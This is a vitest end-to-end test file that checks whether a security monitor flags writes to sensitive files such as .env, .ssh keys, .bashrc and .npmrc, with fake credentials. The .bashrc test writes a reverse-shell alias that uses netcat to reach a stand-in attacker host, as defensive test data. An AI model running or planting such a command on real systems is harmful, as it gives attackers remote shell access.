// E2E-001: Live Filesystem Detection
// Proves ARP's FilesystemMonitor detects real file operations on disk.
// No event injection — the monitor itself detects real OS activity.
//
// ATLAS: AML.T0055 (Unsecured Credentials), AML.T0081 (Modify AI Agent Configuration)
// OWASP: LLM02, LLM06
// OWASP Agentic: ASI03 (Identity & Privilege Abuse), ASI05 (Unexpected Code Execution (RCE))

import { it, expect, beforeEach, afterEach, type TestContext } from 'vitest';
import * as fs from 'fs';
import * as path from 'path';
import * as os from 'os';
import { describeWithCapability } from '../harness/capabilities';
import { createAdapter } from '../harness/create-adapter';
import {
  detectWrite,
  endWatchCase,
  fileEventFor,
  isSensitiveFileEvent,
  isWatchProbeEvent,
  openControlWatchOrSkip,
  probeWaitMs,
  readinessSkip,
  skipInconclusive,
  waitForFilesystemWatch,
  type ControlWatch,
  type WatchCaseParts,
} from '../harness/filesystem-watch';
import type { SecurityEvent, SecurityProductAdapter } from '../harness/adapter';

describeWithCapability('filesystem-monitoring', 'E2E-001: Live Filesystem Detection', () => {
  let arp: SecurityProductAdapter;
  let watchDir: string;
  let control: ControlWatch;
  // What the current case has opened so far. afterEach ends exactly that,
  // also for a case that was skipped before the product was created.
  let opened: WatchCaseParts = {};

  /**
   * The product's event for the write of `name`, awaited for `timeoutMs`
   * from the write as before. When the product reports nothing in time, the
   * case fails if the harness's own watcher saw the path in that time (the
   * host delivered the event) and is skipped as inconclusive if it saw
   * nothing (the host delivered no event to this process). A detection case
   * never passes without the product's own event, and records that it got
   * one for the release smoke's drift guard. detectWrite and the predicates
   * the cases pass it are in src/harness/filesystem-watch.ts, with their
   * tests.
   */
  function detect(
    ctx: TestContext,
    name: string,
    predicate: (e: SecurityEvent) => boolean,
    timeoutMs: number,
  ): Promise<SecurityEvent> {
    return detectWrite(ctx, arp, control, name, predicate, timeoutMs);
  }

  beforeEach(async (ctx) => {
    const hookStart = Date.now();
    // Create a temp directory to watch
    watchDir = fs.mkdtempSync(path.join(os.tmpdir(), 'arp-e2e-fs-'));
    opened = { dir: watchDir };

    // The harness's own watcher, opened before the product starts and closed
    // after it stops, records every file event the host delivers to this
    // process. The product's watcher is added by start() below; no watcher is
    // added or removed between the readiness wait and the case's write.
    // Where this Node.js has no recursive fs.watch (Linux before 19.1.0), the
    // watcher cannot be opened, so the case is not measured: it ends here, as
    // inconclusive, before the product is created, with a message that says
    // so. Any other error on opening the watcher fails the case.
    control = opened.control = openControlWatchOrSkip(ctx, watchDir);

    arp = opened.adapter = createAdapter({
      monitors: {
        process: false,
        network: false,
        filesystem: true,
      },
      filesystemWatchPaths: [watchDir],
    });
    await arp.start();

    // Write probe files until the watcher reports one, instead of pausing a
    // fixed 200 ms. The wait is at most 5 s, and it ends 1 s before this hook's
    // 10 s timeout (vitest.config.ts), so a product that is slow to start has
    // the time the fixed pause left it: the wait is never shorter than 200 ms.
    // The probe events are excluded below. When the product reported no
    // probe, the case still makes its write if the harness's own watcher saw a
    // probe file; if that watcher saw none either, the host delivered no file
    // event, so the case is not measured: it ends here, as inconclusive,
    // without its write.
    const budgetMs = probeWaitMs(Date.now() - hookStart);
    const ready = await waitForFilesystemWatch(arp, watchDir, { timeoutMs: budgetMs });
    const inconclusive = ready ? undefined : readinessSkip(control, watchDir, budgetMs);
    if (inconclusive) skipInconclusive(ctx, inconclusive);
  });

  afterEach(async () => {
    // The control is closed and the directory removed also when stop() rejects.
    const parts = opened;
    opened = {};
    await endWatchCase(parts);
  });

  it('should detect creation of a .env file as a sensitive path violation', async (ctx) => {
    // Write a real .env file to the watched directory
    const envPath = path.join(watchDir, '.env');
    fs.writeFileSync(envPath, 'SECRET_KEY=test123\n');

    // Wait for the filesystem monitor to pick it up
    const event = await detect(ctx, '.env', isSensitiveFileEvent, 5000);

    expect(event).toBeDefined();
    expect(event.source).toBe('filesystem');
    expect(event.category).toBe('violation');
    expect(event.severity).toBe('high');
    expect(event.data?.sensitive).toBe(true);
    expect(String(event.data?.path)).toContain('.env');
  });

  it('should detect creation of a .ssh directory file as sensitive', async (ctx) => {
    // Create a .ssh subdirectory and a key file
    const sshDir = path.join(watchDir, '.ssh');
    fs.mkdirSync(sshDir, { recursive: true });
    fs.writeFileSync(path.join(sshDir, 'id_rsa'), 'fake-private-key\n');

    const event = await detect(ctx, '.ssh', fileEventFor('.ssh'), 5000);

    expect(event).toBeDefined();
    expect(event.category).toBe('violation');
    expect(event.severity).toBe('high');
    expect(event.data?.sensitive).toBe(true);
  });

  it('should detect .bashrc write as persistence attempt', async (ctx) => {
    const bashrcPath = path.join(watchDir, '.bashrc');
    fs.writeFileSync(bashrcPath, 'alias backdoor="nc -e /bin/sh attacker.com 4444"\n');

    const event = await detect(ctx, '.bashrc', fileEventFor('.bashrc'), 5000);

    expect(event).toBeDefined();
    expect(event.category).toBe('violation');
    expect(event.severity).toBe('high');
  });

  it('should detect .npmrc credential file access', async (ctx) => {
    const npmrcPath = path.join(watchDir, '.npmrc');
    fs.writeFileSync(npmrcPath, '//registry.npmjs.org/:_authToken=npm_FAKE\n');

    const event = await detect(ctx, '.npmrc', fileEventFor('.npmrc'), 5000);

    expect(event).toBeDefined();
    expect(event.category).toBe('violation');
    expect(event.severity).toBe('high');
    expect(event.data?.sensitive).toBe(true);
  });

  it('should allow normal file creation without triggering violations', async () => {
    // Create a normal, non-sensitive file
    const normalPath = path.join(watchDir, 'output.json');
    fs.writeFileSync(normalPath, '{"status": "ok"}\n');

    // Wait briefly for any potential events
    await new Promise((r) => setTimeout(r, 1500));

    // Should NOT have any violations
    const violations = arp.getEventsByCategory('violation').filter((e) => !isWatchProbeEvent(e));
    expect(violations.length).toBe(0);

    // Might have a normal 'rename' event from fs.watch
    const allEvents = arp.getEvents().filter((e) => !isWatchProbeEvent(e));
    for (const event of allEvents) {
      expect(event.category).not.toBe('violation');
      expect(event.category).not.toBe('threat');
    }
  });
});
